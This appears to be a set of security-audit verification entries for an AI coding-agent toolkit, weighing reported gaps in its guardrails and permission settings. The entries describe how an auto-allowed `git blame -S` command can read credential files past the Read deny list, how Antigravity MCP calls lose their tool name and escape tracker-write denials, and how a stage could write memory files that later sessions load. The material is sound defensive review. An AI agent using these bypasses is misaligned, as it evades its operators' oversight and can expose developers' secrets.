verifications.reason: Every named site starts a bare tool name with no shell and no resolved path; several set cwd to the project root (autopilot.mjs:1163, repos.mjs:37/64, init.mjs:1732/1741/1755, hunt-preflight.mjs:328), and the rest inherit a cwd at or under the root. The only fix since audit item 16 covers hunt-preflight's audit tools alone, and no code sets NoDefaultCurrentDirectoryInExePath for Node's own environment. Unseen: the parent environment (not protected by default on Windows); libuv search order judged from source, not tested.

verifications.title: The MCP write-deny in the autopilot guardrail is a name list, the per-ticket MCP isolation is claude-code only, and Antigravity MCP calls lose their tool name
verifications.reason: The autopilot profile's only MCP rule is the tracker name list (no default deny; a path-less, URL-less, command-less MCP call reaches exit 0). MCP isolation is applied for claude-code only, the watcher refuses only devin, and guardrail-cli.mjs turns Antigravity's call_mcp_tool into 'mcp__tool' which normalises to 'tool' and skips even the Odoo/tickets tracker-write denials. Unseen: which MCP servers a watcher host's harness actually loads, and Antigravity's real call_mcp_tool event shape.

verifications.title: Shipped .claude/settings.json allows git blame, whose -S and --ignore-revs-file options read any file; the Read deny list for credentials is bypassed
verifications.reason: Init writes settings.json.tmpl unchanged: line 15 auto-allows Bash(git blame:*), the only blame deny is --contents, the Read denies cover only the Read tool, and the guardrail is inert outside a QA/hunt/autopilot run (inside a run its line-944 rule blocks literal credential paths, but not the non-canonical spellings of the key-path finding). The unseen step is Claude Code's runtime prefix matching of git blame -S <path> and whether a sandbox is on; the template's own --contents and --output denies assume that matching.

verifications.title: Scaffolded settings pre-approve build and test commands that execute repository-controlled code, with unrestricted arguments
verifications.reason: The autopilot never checks out a third-party branch (only its own <ID>-* branches from the team's base) and its stages run with bypassPermissions, so this allow-list is never consulted there; in the interactive path the author of the hostile tree also controls the committed .claude/settings.json (only settings.local.json is gitignored), and running the project's own suite is the disclosed use init asks the developer to approve, so the default entries cross no trust boundary.

verifications.title: An autopilot stage can write the team-memory store and nested agent instruction files that every later session loads, because they are not protected paths
verifications.reason: The write gap is real (AUTOPILOT_PROTECTED_RE protects only root instruction files) but deliberate: commit 12e150f and RELEASE-NOTES.md:179 reversed this exact hardening on the grounds that memory and nested AGENTS.md edits show in the PR diff. Persistence needs a human merge: the engine only opens PRs and never merges, and autopilot-watcher.md:67 requires a reviewed merge, the same control that covers every line of code a stage writes.
